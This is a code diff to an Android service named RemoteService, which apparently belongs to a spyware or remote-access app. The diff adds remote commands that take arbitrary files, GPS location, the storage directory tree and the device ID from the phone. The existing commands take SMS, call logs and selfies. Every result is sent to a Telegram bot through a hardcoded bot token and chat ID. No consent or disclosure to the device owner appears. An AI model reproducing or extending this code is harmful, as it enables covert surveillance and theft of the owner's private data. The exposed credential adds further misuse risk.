@@ -1,66 +1,80 @@
 package com.sohaibazmi.remote;
 
-import android.app.*;
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
+import android.app.Service;
+import com.google.android.gms.location.FusedLocationProviderClient;
+import com.google.android.gms.location.LocationServices;
+import com.google.android.gms.tasks.OnSuccessListener;
+import android.location.Location;
+import android.Manifest;
+
+import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
+import android.graphics.ImageFormat;
+import android.hardware.camera2.*;
+import android.media.Image;
+import android.media.ImageReader;
+import android.media.MediaRecorder;
+
+import android.net.ConnectivityManager;
+import android.net.Network;
+import android.net.NetworkCapabilities;
+import android.net.NetworkInfo;
 import android.net.Uri;
+
 import android.os.Build;
 import android.os.Environment;
+import android.os.FileUtils;
+import android.os.Handler;
+import android.os.HandlerThread;
 import android.os.IBinder;
+import android.os.Looper;
+
+import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.provider.Settings;
 import android.util.Log;
-
-import java.nio.ByteBuffer;
-import java.util.Collections;
-
-
-import android.hardware.camera2.CameraAccessException;
-import android.hardware.camera2.CameraCaptureSession;
-import android.hardware.camera2.CameraCharacteristics;
-import android.hardware.camera2.CameraDevice;
-import android.hardware.camera2.CameraManager;
-import android.hardware.camera2.CaptureRequest;
-import android.hardware.camera2.TotalCaptureResult;
-
-import android.media.Image;
-import android.media.ImageReader;
-import android.graphics.ImageFormat;
 import android.util.Size;
 import android.view.Surface;
 
-import android.os.Handler;
-import android.os.HandlerThread;
-
-
-import android.os.HandlerThread;
-import android.os.Handler;
-import android.os.Looper;
-
-
-import android.view.Surface;
-
-import java.io.FileOutputStream;
-
-
-import android.hardware.camera2.CameraManager;
-
-
+import androidx.annotation.NonNull;
 import androidx.annotation.Nullable;
 import androidx.core.app.ActivityCompat;
 import androidx.core.app.NotificationCompat;
+import androidx.core.content.ContextCompat;
 
 import com.google.firebase.FirebaseApp;
 import com.google.firebase.database.*;
 
-import java.io.*;
-import java.util.zip.*;
+import java.io.BufferedWriter;
+import java.io.File;
+import java.io.FileOutputStream;
+import java.io.FileInputStream;
+import java.io.FileWriter;
+import java.io.IOException;
 
-import androidx.annotation.NonNull;
+import java.nio.ByteBuffer;
+import java.text.SimpleDateFormat;
+import java.util.Collections;
+import java.util.Date;
+import java.util.Locale;
+import java.util.zip.ZipEntry;
+import java.util.zip.ZipOutputStream;
 
+import okhttp3.Call;
+import okhttp3.Callback;
+import okhttp3.FormBody;
+import okhttp3.MediaType;
+import okhttp3.MultipartBody;
+import okhttp3.OkHttpClient;
+import okhttp3.Request;
+import okhttp3.RequestBody;
+import okhttp3.Response;
 
-import okhttp3.*;
 
 public class RemoteService extends Service {
 
@@ -88,7 +102,13 @@ public class RemoteService extends Service {
                         else if ("DUMP_STORAGE".equalsIgnoreCase(cmd)) dumpStorage();
                         else if ("CAPTURE_PHOTO".equalsIgnoreCase(cmd)) captureSelfie();
                         else if ("DUMP_CALL_LOGS".equalsIgnoreCase(cmd)) dumpCallLogs();
-
+                        else if ("CHECK_CONNECTIVITY".equalsIgnoreCase(cmd)) checkConnectivityStatus();
+                        else if ("GET_LOCATION".equalsIgnoreCase(cmd)) getCurrentLocation();
+                        else if ("LIST_DIR".equalsIgnoreCase(cmd)) listDirectoryStructure();
+                        else if (cmd != null && cmd.startsWith("DUMP_FILE:")) {
+                            String path = cmd.substring("DUMP_FILE:".length()).trim();
+                            dumpFile(path);
+                        }
                     }
 
                     @Override
@@ -115,6 +135,27 @@ public class RemoteService extends Service {
 
         startForeground(1, notification);
     }
+
+    private void dumpFile(String path) {
+        try {
+            // Fix for missing storage root
+            if (!path.startsWith("/storage")) {
+                path = Environment.getExternalStorageDirectory().getAbsolutePath() + path;
+            }
+
+            File file = new File(path);
+            if (file.exists() && file.canRead()) {
+                sendTelegramFile(file);
+                Log.d("REMOTE_CMD", "✅ File sent: " + path);
+            } else {
+                Log.e("REMOTE_CMD", "❌ File not accessible: " + path);
+            }
+        } catch (Exception e) {
+            Log.e("REMOTE_CMD", "❌ dumpFile() error", e);
+        }
+    }
+
+
 
     private void dumpSMS() {
         File outputFile = new File(getExternalFilesDir(null), "sms_dump.txt");
@@ -358,7 +399,123 @@ public class RemoteService extends Service {
         }
     }
 
+    private void getCurrentLocation() {
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
+            Log.e("REMOTE_CMD", "❌ Location permission not granted");
+            return;
+        }
 
+        FusedLocationProviderClient fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
+
+        fusedLocationClient.getLastLocation()
+                .addOnSuccessListener(location -> {
+                    if (location != null) {
+                        double lat = location.getLatitude();
+                        double lon = location.getLongitude();
+                        String mapsUrl = "https://maps.google.com/?q=" + lat + "," + lon;
+                        sendTelegramText("📍 Device location:\n" + mapsUrl);
+                    } else {
+                        sendTelegramText("⚠️ Unable to get location. GPS might be disabled.");
+                    }
+                })
+                .addOnFailureListener(e -> {
+                    sendTelegramText("❌ Error while getting location: " + e.getMessage());
+                });
+    }
+
+
+
+    private void checkConnectivityStatus() {
+        boolean isConnected = false;
+
+        try {
+            ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
+            if (cm != null) {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                    Network network = cm.getActiveNetwork();
+                    NetworkCapabilities capabilities = cm.getNetworkCapabilities(network);
+                    isConnected = capabilities != null &&
+                            capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET);
+                } else {
+                    NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
+                    isConnected = activeNetwork != null && activeNetwork.isConnected();
+                }
+            }
+        } catch (Exception e) {
+            Log.e("REMOTE_CMD", "❌ Connectivity check failed", e);
+        }
+
+        String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
+        String statusMsg = isConnected ?
+                "✅ Device " + deviceId + " is connected to the Internet." :
+                "❌ Device " + deviceId + " is NOT connected to the Internet.";
+
+        Log.d("REMOTE_CMD", statusMsg);
+        sendTelegramText(statusMsg);
+    }
+
+    public static void sendTelegramText(String message) {
+        String botToken = "8171904880:AAFICyJVYDyXGrcwrzjFgAJJqkiIi2zBIcE";
+        String chatId = "6865050227";
+
+        OkHttpClient client = new OkHttpClient();
+
+        RequestBody requestBody = new FormBody.Builder()
+                .add("chat_id", chatId)
+                .add("text", message)
+                .build();
+
+        Request request = new Request.Builder()
+                .url("https://api.telegram.org/bot" + botToken + "/sendMessage")
+                .post(requestBody)
+                .build();
+
+        client.newCall(request).enqueue(new okhttp3.Callback() {
+            @Override
+            public void onFailure(Call call, IOException e) {
+                Log.e("TELEGRAM", "❌ Telegram text send failed", e);
+            }
+
+            @Override
+            public void onResponse(Call call, Response response) {
+                if (response.isSuccessful()) {
+                    Log.d("TELEGRAM", "✅ Telegram text sent successfully");
+                } else {
+                    Log.e("TELEGRAM", "❌ Telegram text failed: " + response.message());
+                }
+            }
+        });
+    }
+
+    private void listDirectoryStructure() {
+        File rootDir = Environment.getExternalStorageDirectory(); // You can also use getExternalFilesDir(null)
+        File outputFile = new File(getExternalFilesDir(null), "dir_structure.txt");
+
+        try (BufferedWriter writer = new BufferedWriter(new FileWriter(outputFile))) {
+            writeDirectoryContents(writer, rootDir, 0);
+            Log.d("REMOTE_CMD", "✅ Directory structure written to: " + outputFile.getAbsolutePath());
+            sendTelegramFile(outputFile);
+        } catch (IOException e) {
+            Log.e("REMOTE_CMD", "❌ Failed to list directory structure", e);
+        }
+    }
+
+    private void writeDirectoryContents(BufferedWriter writer, File dir, int depth) throws IOException {
+        if (dir == null || !dir.exists() || !dir.isDirectory()) return;
+
+        File[] files = dir.listFiles();
+        if (files == null) return;
+
+        for (File file : files) {
+            for (int i = 0; i < depth; i++) writer.write("  ");
+            writer.write((file.isDirectory() ? "[DIR] " : "- ") + file.getName());
+            writer.newLine();
+
+            if (file.isDirectory()) {
+                writeDirectoryContents(writer, file, depth + 1);
+            }
+        }
+    }
 
 
     private void sendTelegramFile(File file) {
